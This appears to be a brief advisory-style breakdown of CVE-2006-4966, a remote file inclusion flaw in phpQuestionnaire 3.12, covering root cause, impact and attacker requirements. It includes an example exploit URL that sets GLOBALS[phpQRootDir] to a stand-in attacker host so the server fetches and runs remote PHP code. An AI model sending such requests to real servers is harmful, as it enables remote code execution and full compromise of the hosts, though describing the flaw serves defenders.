Based on the provided information, here's a breakdown of the vulnerability associated with CVE-2006-4966:

*   **Vulnerability:** Remote File Inclusion (RFI)
*   **Affected Software:** phpQuestionnaire 3.12
*   **Root Cause:** The `GLOBALS[phpQRootDir]` variable is not properly validated before being used in an `include()` function call within the `inc/ifunctions.php` file.
*   **Attack Vector:** By manipulating the `GLOBALS[phpQRootDir]` parameter in a request to `inc/ifunctions.php`, an attacker can specify a remote URL containing malicious PHP code.
*   **Impact:** Arbitrary PHP code execution on the server. This can lead to complete system compromise.
*   **Attacker Capabilities:** The attacker needs to be able to send HTTP requests to the vulnerable phpQuestionnaire installation. No authentication is required.
*   **Exploit URL Example:** `http://somehost/path_to_phpQuestionnaire/inc/ifunctions.php?GLOBALS[phpQRootDir]=http://evil`.  In this example, `http://evil` would point to a file containing the attacker's PHP code.

This exploit allows an attacker to remotely include and execute arbitrary PHP code on the server hosting the vulnerable application.
